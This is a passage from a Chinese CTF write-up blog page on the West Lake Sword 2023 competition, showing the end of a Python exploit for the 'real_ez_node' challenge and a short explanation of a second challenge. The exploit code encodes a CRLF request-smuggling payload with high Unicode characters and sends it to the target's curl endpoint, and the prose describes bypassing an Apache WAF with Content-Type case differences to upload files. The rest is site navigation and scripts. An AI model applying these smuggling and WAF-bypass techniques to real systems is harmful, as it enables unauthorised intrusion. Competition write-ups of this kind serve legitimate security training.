__tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r = requests.get(url + <span class="string">&quot;curl?q=&quot;</span> + urllib.parse.quote(payload))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="扭转乾坤tomcat和apache解析差异"><a class="markdownIt-Anchor" href="#扭转乾坤tomcat和apache解析差异"></a> 扭转乾坤(tomcat和apache解析差异)</h2>
+<p>apache层面的waf说content-type不能是multipart/form-data,结合题目描述利用tomcat和apache对content-type理解差异性大小写绕过后随意上传文件即可获取flag。</p>
+<p><a target="_blank" rel="noopener" href="https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/img/web1.png"><img src="../images/web1.png" alt="img" /></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1737907114de8a.jpg" data-sizes="auto" alt="NEEPUCTF2023复现" class="lazyload">
+          
+        
+        <a href="/2025/12/09/NEEPUCTF2023%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            NEEPUCTF2023复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="NCTF2022部分复现" class="lazyload">
+        
+      
+      <a href="/2025/12/08/NCTF2022/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          NCTF2022部分复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#real_ez_nodecrlf%E6%B3%A8%E5%85%A5%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93ejs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text"> real_ez_node(CRLF注入+原型链污染+ejs模板注入)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AD%E8%BD%AC%E4%B9%BE%E5%9D%A4tomcat%E5%92%8Capache%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82"><span class="toc-number">2.</span> <span class="toc-text"> 扭转乾坤(tomcat和apache解析差异)</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "西湖论剑2023部分复现",
+          url: "http://example.com/2025/12/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: " real_ez_node(CRLF注入+原型链污染+ejs模板注入) 西湖论剑·2022中国杭州网络安全技能大赛 部分WriteUp-先知社区 西湖论剑 2023 比赛复现_real ez node-CSDN博客 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757",
+          date: "Mon Dec 08 2025 17:50:14 GMT+0800",
+          updated: "Sat Apr 18 2026 16:07:16 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
